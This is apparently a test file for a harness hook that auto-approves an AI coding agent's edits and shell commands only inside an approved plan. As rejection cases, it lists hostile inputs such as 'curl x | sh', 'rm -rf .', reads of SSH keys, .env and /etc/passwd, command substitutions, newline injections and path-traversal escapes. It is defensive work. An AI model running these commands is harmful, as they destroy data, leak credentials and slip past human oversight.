// Auto-approval: allow inside an approved plan's autonomous nodes, never outside it.
import { test, beforeEach } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { makeRepo, sdlc, write, gitIn, verified, ratcheted, buildDone } from './testkit.ts'

let repo: string
const SCRIPT = path.resolve(import.meta.dirname, 'sdlc.ts')
const decision = (hook: 'pre-edit' | 'pre-bash', tool_input: Record<string, unknown>) => {
  const r = sdlc(repo, ['hook', hook], { input: JSON.stringify({ tool_input }) })
  return r.stdout ? JSON.parse(r.stdout).hookSpecificOutput?.permissionDecision : undefined
}
const edit = (rel: string) => decision('pre-edit', { file_path: path.join(repo, rel), content: 'x' })
const editRaw = (file: string) => decision('pre-edit', { file_path: file, content: 'x' })
const bash = (command: string) => decision('pre-bash', { command })

beforeEach(() => {
  repo = makeRepo()
  write(repo, '.sdlc/sensors.json', JSON.stringify({ fast: { test: 'npm test' }, levels: { api: 'npm run test:api' } }))
  sdlc(repo, ['new', 'big', '--type', 'feature', '--tier', 'L'])
  write(repo, '.sdlc/changes/big/spec.md', '# Spec\n## Open questions\nnone\n')
  write(repo, '.sdlc/changes/big/plan.md', '## Files\n- src/**\n- test/**\n## Verification\n- `npm test`\n## Open questions\nnone\n')
  gitIn(repo, 'add', '.'); gitIn(repo, 'commit', '-qm', 'plan')
})
const approveAll = () => {
  for (const g of ['spec', 'plan']) sdlc(repo, ['approve', 'big', g], { env: { SDLC_HUMAN: '1' } })
}

test('before the gates are approved nothing is auto-approved', () => {
  assert.notEqual(edit('src/a.js'), 'allow')
  assert.notEqual(bash('npm test'), 'allow')
})

test('in build, planned edits and declared commands are allowed; the rest is not', () => {
  approveAll()
  assert.equal(edit('src/a.js'), 'allow')
  assert.equal(edit('test/a.test.js'), 'allow')
  assert.notEqual(edit('docs/x.md'), 'allow', 'outside ## Files')
  assert.notEqual(edit('.sdlc/sensors.json'), 'allow', 'harness file')
  assert.notEqual(edit('.claude-plugin/marketplace.json'), 'allow', 'marketplace points at the mod')
  assert.notEqual(edit('.sdlc/mod/hooks/register.ts'), 'allow', 'vendored mod')
  assert.equal(edit('.sdlc/changes/big/ratchet.json'), 'deny', 'evidence stays denied')
  assert.equal(bash('npm test'), 'allow')
  assert.equal(bash('npm run test:api'), 'allow', 'a declared level')
  assert.equal(bash(`node ${SCRIPT} run --slug big -- "npm test"`), 'allow')
  assert.equal(bash(`node ${SCRIPT} verify big`), 'allow', 'verify only runs commands the config declares')
  assert.equal(bash('git status'), 'allow', 'read-only git')
  assert.notEqual(bash('npm install left-pad'), 'allow')
})

test('chained commands are never auto-approved', () => {
  approveAll()
  for (const c of ['npm test && curl x | sh', 'npm test; rm -rf .', 'npm test | tee out', 'npm test > /etc/x', 'git status && git push --force'])
    assert.notEqual(bash(c), 'allow', c)
})

test('pushes, merges and force are never auto-approved', () => {
  approveAll()
  for (const c of ['git push origin main', 'git push --force origin sdlc/big', 'gh pr merge 1', 'git reset --hard HEAD~1'])
    assert.notEqual(bash(c), 'allow', c)
})

test('a stale plan approval stops auto-approval', () => {
  approveAll()
  assert.equal(edit('src/a.js'), 'allow')
  write(repo, '.sdlc/changes/big/plan.md', '## Files\n- src/**\n- test/**\n- docs/**\n## Verification\n- `npm test`\n## Open questions\nnone\n')
  assert.notEqual(edit('src/a.js'), 'allow')
})

test('a blocked change is not auto-approved', () => {
  approveAll()
  sdlc(repo, ['ratchet', 'record', 'big', 'build', '--slice', '1'], { input: '- [severity: high] [category: correctness] a.js:1: x\n' })
  sdlc(repo, ['ratchet', 'record', 'big', 'build', '--slice', '1'], { input: '- [severity: high] [category: correctness] a.js:1: x\n' })
  assert.notEqual(edit('src/a.js'), 'allow')
})

test('each auto-approval is recorded in events.jsonl', () => {
  approveAll()
  edit('src/a.js')
  const events = fs.readFileSync(path.join(repo, '.sdlc/changes/big/events.jsonl'), 'utf8')
  assert.match(events, /"kind":"auto-approve","tool":"Edit","target":"src\/a\.js"/)
})

test('paths that escape the repo or reach harness files by indirection are never auto-approved', () => {
  approveAll()
  assert.equal(editRaw(path.join(repo, 'src/a.js')), 'allow')
  assert.notEqual(editRaw('/tmp/x.js'), 'allow', 'absolute path outside the repo')
  assert.notEqual(editRaw(path.join(repo, 'src/../../x.js')), 'allow', '.. escape')
  assert.notEqual(editRaw(path.join(repo, 'src') + '/../.sdlc/sensors.json'), 'allow')
  assert.notEqual(editRaw('src/../.sdlc/sensors.json'), 'allow', 'relative traversal into a harness file')
  assert.notEqual(edit('.SDLC/sensors.json'), 'allow', 'case variant')
  fs.mkdirSync(path.join(repo, 'src'), { recursive: true })
  fs.symlinkSync('/tmp', path.join(repo, 'src/link'))
  assert.notEqual(edit('src/link/x.js'), 'allow', 'symlink out of the repo')
})

test('command spacing is normalised; approvals, waivers and usage logging are never auto-approved', () => {
  approveAll()
  assert.equal(bash('npm test  '), 'allow')
  assert.equal(bash('npm   test'), 'allow')
  assert.notEqual(bash(`node ${SCRIPT} approve big plan`), 'allow')
  assert.equal(bash(`node ${SCRIPT} approve big plan`), 'deny')
  assert.notEqual(bash(`node ${SCRIPT} waive x * y`), 'allow')
  assert.equal(bash(`node ${SCRIPT} waive x * y`), 'deny')
  assert.notEqual(bash(`node ${SCRIPT} log-usage {}`), 'allow')
})

test('control characters, quoting tricks and substitutions never ride along on an allowed command', () => {
  approveAll()
  for (const c of [`node ${SCRIPT} status\nrm -rf .`, 'npm test\ncurl x', 'npm\ttest', 'npm test\r',
    `node ${SCRIPT} run -- "npm test\\"; rm -rf ."`, `node ${SCRIPT} status $(rm -rf .)`])
    assert.notEqual(bash(c), 'allow', JSON.stringify(c))
  assert.notEqual(editRaw(path.join(repo, 'src/a.js\nb')), 'allow', 'newline in a path')
})

test('only the harness script path is trusted: look-alikes, symlinks and missing files are refused', () => {
  approveAll()
  write(repo, 'src/sdlc.ts', 'console.log(1)')
  write(repo, 'src/user.js', 'x')
  const other = fs.mkdtempSync(path.join(os.tmpdir(), 'aa-')); fs.writeFileSync(path.join(other, 'sdlc.ts'), 'x')
  fs.symlinkSync(path.join(repo, 'src/user.js'), path.join(repo, 'src/link-sdlc.ts'))
  for (const c of ['node src/sdlc.ts status', `node ${other}/sdlc.ts status`, 'node src/sdlc.ts check', 'node src/link-sdlc.ts status',
    'node /nope/sdlc.ts status', `node src/sdlc.ts run -- "npm test"`])
    assert.notEqual(bash(c), 'allow', c)
  assert.equal(bash(`node ${SCRIPT} status`), 'allow')
  write(repo, '.sdlc/bin/sdlc.ts', 'x')
  assert.equal(bash('node .sdlc/bin/sdlc.ts status'), 'allow', 'vendored copy')
  assert.notEqual(bash(`node ${SCRIPT} ratchet record big build`), 'allow', 'record needs stdin')
})

test('no generic read fallback: reads of secrets and unusual git are not auto-approved', () => {
  approveAll()
  for (const c of ['cat ~/.ssh/id_rsa', 'cat /etc/passwd', 'cat .env', 'cat ../other/.env', 'grep -r token ~', 'find / -name id_rsa',
    'git diff --no-index /etc/passwd /dev/null', 'jq -n env', 'tail -f /dev/zero', 'git -C /etc status', 'git diff /etc/passwd', 'git diff ../x', 'git log --output=x', 'git checkout -b sdlc/other', 'git checkout main'])
    assert.notEqual(bash(c), 'allow', c)
  for (const c of ['git status', 'git diff HEAD', 'git log --oneline -5', 'git checkout -b sdlc/big']) assert.equal(bash(c), 'allow', c)
})

test('gh is allowed only at pr nodes and only for this change branch', () => {
  approveAll()
  assert.notEqual(bash('gh pr view sdlc/big'), 'allow', 'build node')
})

test('with no gates configured, a tier S change with a plan Files list auto-approves; a chore without a plan does not', () => {
  sdlc(repo, ['new', 'small', '--type', 'feature', '--tier', 'S'])
  write(repo, '.sdlc/changes/small/plan.md', '## Files\n- src/**\n## Verification\n- `npm test`\n')
  assert.equal(edit('src/a.js'), 'allow')
  fs.rmSync(path.join(repo, '.sdlc/changes/small/plan.md'))
  assert.notEqual(edit('src/a.js'), 'allow')
  assert.notEqual(bash('npm test'), 'allow')
})

test('read-only git leaves no audit event; declared commands do', () => {
  approveAll()
  bash('git status')
  const ev = () => { try { return fs.readFileSync(path.join(repo, '.sdlc/changes/big/events.jsonl'), 'utf8') } catch { return '' } }
  assert.doesNotMatch(ev(), /git status/)
  bash('npm test')
  assert.match(ev(), /"tool":"Bash","target":"npm test"/)
})

test('bash expansions cannot slip a path past the repo check', () => {
  approveAll()
  for (const c of ['git diff ~/.ssh/id_rsa', 'git log -- ~/x', 'git diff src/*', 'git show {a,b}', 'git diff --output=~/x', 'git diff a:~/x'])
    assert.notEqual(bash(c), 'allow', c)
  assert.equal(bash('git diff HEAD~1'), 'allow')
})

test('gh comment bodies and gh outside pr nodes are never auto-approved', () => {
  approveAll()
  for (const f of ['.sdlc/changes/big/pr-comment.md', '.env', 'src/a.js'])
    assert.notEqual(bash(`gh pr comment sdlc/big --body-file ${f}`), 'allow', `${f} at build`)
})

test('plan Verification commands count only while the plan approval is current', () => {
  write(repo, '.sdlc/changes/big/plan.md', '## Files\n- src/**\n## Verification\n- `npm test`\n- `node -e 1`\n## Open questions\nnone\n')
  gitIn(repo, 'add', '.'); gitIn(repo, 'commit', '-qm', 'plan2')
  assert.notEqual(bash('node -e 1'), 'allow', 'unapproved plan')
  approveAll()
  assert.equal(bash('node -e 1'), 'allow', 'approved plan')
  write(repo, '.sdlc/changes/big/plan.md', '## Files\n- src/**\n## Verification\n- `npm test`\n- `node -e 1`\n- `node -e 2`\n## Open questions\nnone\n')
  assert.notEqual(bash('node -e 1'), 'allow', 'stale')
  assert.notEqual(bash('npm test'), 'allow', 'step() holds for the stale gate')
})

test('an ungated tier S plan cannot declare its own commands', () => {
  sdlc(repo, ['new', 'small', '--type', 'feature', '--tier', 'S'])
  write(repo, '.sdlc/changes/small/plan.md', '## Files\n- src/**\n## Verification\n- `node -e 1`\n')
  assert.equal(edit('src/a.js'), 'allow')
  assert.notEqual(bash('node -e 1'), 'allow')
  assert.equal(bash('npm test'), 'allow')
})

const bashAt = (cwd: string, command: string) => {
  const r = sdlc(repo, ['hook', 'pre-bash'], { input: JSON.stringify({ cwd, tool_input: { command } }) })
  return r.stdout ? JSON.parse(r.stdout).hookSpecificOutput?.permissionDecision : undefined
}

test('a foreign or nested working directory never gets auto-approval', () => {
  approveAll()
  write(repo, '.sdlc/bin/sdlc.ts', 'x')
  const evil = fs.mkdtempSync(path.join(os.tmpdir(), 'aa-evil-'))
  fs.mkdirSync(path.join(evil, '.sdlc/bin'), { recursive: true }); fs.writeFileSync(path.join(evil, '.sdlc/bin/sdlc.ts'), 'x')
  for (const c of ['node .sdlc/bin/sdlc.ts status', 'git status', 'npm test']) {
    assert.notEqual(bashAt(evil, c), 'allow', `foreign: ${c}`)
    assert.notEqual(bashAt(path.join(repo, 'src'), c), 'allow', `subdirectory: ${c}`)
    assert.equal(bashAt(repo, c), 'allow', `root: ${c}`)
  }
  assert.equal(bash('git status'), 'allow', 'cwd omitted')
})

test('dot-directories and env files never auto-approve, in any tier', () => {
  sdlc(repo, ['new', 'small', '--type', 'feature', '--tier', 'S'])
  write(repo, '.sdlc/changes/small/plan.md', '## Files\n- **\n## Verification\n- `npm test`\n')
  assert.equal(edit('src/a.js'), 'allow')
  for (const f of ['.githooks/pre-commit', '.github/workflows/x.yml', '.env.local', '.husky/pre-push', '.vscode/tasks.json', 'src/.hidden/a.js'])
    assert.notEqual(edit(f), 'allow', f)
})

test('read-only agents do not get the harness script from a foreign working directory', () => {
  const ask = (cwd: string) => {
    const r = sdlc(repo, ['hook', 'pre-bash'], { input: JSON.stringify({ cwd, agent_type: 'rig:reviewer', tool_input: { command: `node ${SCRIPT} status` } }) })
    return r.stdout ? JSON.parse(r.stdout).hookSpecificOutput?.permissionDecision : undefined
  }
  assert.equal(ask(os.tmpdir()), 'deny')
  assert.notEqual(ask(repo), 'deny')
})

test('the pinned-script quality command is auto-approved during an autonomous node', () => {
  approveAll()
  assert.equal(bash(`node ${SCRIPT} quality big`), 'allow')
  assert.notEqual(bash(`node ${SCRIPT} quality big; rm -rf .`), 'allow')
})

test('the pinned-script scorecard command is auto-approved during an autonomous node', () => {
  approveAll()
  assert.equal(bash(`node ${SCRIPT} scorecard big --json`), 'allow')
  assert.notEqual(bash(`node ${SCRIPT} scorecard big; rm -rf .`), 'allow')
})

test('the pinned-script pr-checks command is auto-approved, but pr (commit and push) is not', () => {
  approveAll()
  assert.equal(bash(`node ${SCRIPT} pr-checks big`), 'allow')
  assert.notEqual(bash(`node ${SCRIPT} pr-checks big; rm -rf .`), 'allow')
  assert.notEqual(bash(`node ${SCRIPT} pr big --message x`), 'allow')
})

test('a pinned-script argument with a .. segment is never auto-approved', () => {
  approveAll()
  for (const c of ['quality ..', 'quality ../x', 'quality ../..', 'ratchet show ..', 'status a/../b']) assert.notEqual(bash(`node ${SCRIPT} ${c}`), 'allow', c)
})

// A small change driven to a given node, so bash approval is judged there.
function atNode(node: 'build' | 'pr' | 'pr-review'): void {
  repo = makeRepo()
  sdlc(repo, ['new', 'tiny', '--type', 'chore', '--tier', 'S'])
  if (node !== 'build') verified(repo, 'tiny')
  write(repo, 'src/app.js', 'x\n')
  write(repo, '.sdlc/changes/tiny/plan.md', '## Files\n- src/app.js\n')
  if (node === 'build') return
  ratcheted(repo, 'tiny')
  if (node === 'pr-review') assert.equal(sdlc(repo, ['pr', 'tiny', '--message', 'chore: tiny']).code, 0)
}
const NODE = `node --disable-warning=ExperimentalWarning ${SCRIPT}`

test('ratchet record is auto-approved only in the --from form, inside the change folder', () => {
  atNode('build')
  write(repo, '.sdlc/changes/tiny/review-slice-1.md', 'verdict: pass\n')
  assert.equal(bash(`${NODE} ratchet record tiny build --slice 1 --from .sdlc/changes/tiny/review-slice-1.md`), 'allow')
  assert.equal(bash(`${NODE} ratchet record tiny build --from .sdlc/changes/tiny/review-slice-1.md`), 'allow')
  for (const c of [
    `${NODE} ratchet record tiny build --slice 1 --from /etc/passwd`,
    `${NODE} ratchet record tiny build --slice 1 --from .sdlc/changes/tiny/../../sensors.json`,
    `${NODE} ratchet record tiny build --slice 1 < .sdlc/changes/tiny/review-slice-1.md`,
    `${NODE} ratchet record tiny build --slice 1`,
    `${NODE} ratchet record other build --slice 1 --from .sdlc/changes/tiny/review-slice-1.md`,
    `${NODE} ratchet record tiny sensors --from .sdlc/changes/tiny/review-slice-1.md`,
  ]) assert.notEqual(bash(c), 'allow', c)
  const out = path.join(os.tmpdir(), 'rig-out-' + process.pid)
  fs.mkdirSync(out, { recursive: true })
  fs.writeFileSync(path.join(out, 'r.md'), 'verdict: pass\n')
  fs.symlinkSync(out, path.join(repo, '.sdlc/changes/tiny/link'))
  assert.notEqual(bash(`${NODE} ratchet record tiny build --slice 1 --from .sdlc/changes/tiny/link/r.md`), 'allow', 'symlink out')
})

test('ratchet record for sensors and test is never auto-approved, even at that node', () => {
  atNode('build')
  verified(repo, 'tiny'); buildDone(repo, 'tiny')
  assert.equal(JSON.parse(sdlc(repo, ['status', '--json']).stdout).step.node, 'sensors')
  write(repo, '.sdlc/changes/tiny/ok.md', 'verdict: pass\n')
  for (const n of ['sensors', 'test']) assert.notEqual(bash(`${NODE} ratchet record tiny ${n} --from .sdlc/changes/tiny/ok.md`), 'allow', n)
})

test('pr is auto-approved at the pr node with one quoted message, and --followup at pr-review', () => {
  atNode('pr')
  assert.equal(bash(`${NODE} pr tiny --message "feat(app): add the thing, fast; really"`), 'allow')
  assert.notEqual(bash(`${NODE} pr tiny --followup --message "fix: x"`), 'allow', 'followup belongs to pr-review')
  for (const c of [
    `${NODE} pr tiny --message "feat: $(id)"`,
    `${NODE} pr tiny --message "feat: \`id\`"`,
    `${NODE} pr tiny --message "feat: $HOME"`,
    `${NODE} pr tiny --message "feat: a\nb"`,
    `${NODE} pr tiny --message "feat: a\\"b"`,
    `${NODE} pr tiny --message 'feat: x'`,
    `${NODE} pr tiny --message "feat: x" && id`,
    `${NODE} pr tiny --message "--force"`,
    `${NODE} pr other --message "feat: x"`,
    `${NODE} pr tiny >/dev/null --message "feat: x"`,
    `${NODE} pr tiny --message "feat: x" 2>&1`,
    `${NODE} pr tiny & --message "feat: x"`,
  ]) assert.notEqual(bash(c), 'allow', c)
  assert.notEqual(bash(`${NODE} pr tiny --message "a\nb"`.replace('\\n', '\n')), 'allow', 'real newline')
})

test('pr is refused at build; --followup is allowed at pr-review', () => {
  atNode('build')
  assert.notEqual(bash(`${NODE} pr tiny --message "feat: x"`), 'allow')
  atNode('pr-review')
  assert.equal(bash(`${NODE} pr tiny --followup --message "fix: review findings"`), 'allow')
  assert.notEqual(bash(`${NODE} pr tiny --message "fix: review findings"`), 'allow', 'plain pr is done')
})

test('the bash allow reason says "approved plan" only when a plan was approved', () => {
  const reason = () => {
    const r = sdlc(repo, ['hook', 'pre-bash'], { input: JSON.stringify({ tool_input: { command: 'git status' } }) })
    return JSON.parse(r.stdout).hookSpecificOutput.permissionDecisionReason as string
  }
  approveAll()
  assert.match(reason(), /big's approved plan/)
  sdlc(repo, ['new', 'tiny', '--type', 'chore', '--tier', 'S'])
  write(repo, '.sdlc/changes/tiny/plan.md', '## Files\n- src/**\n')
  const ungated = reason()
  assert.match(ungated, /tiny's plan/)
  assert.doesNotMatch(ungated, /approved plan/)
})
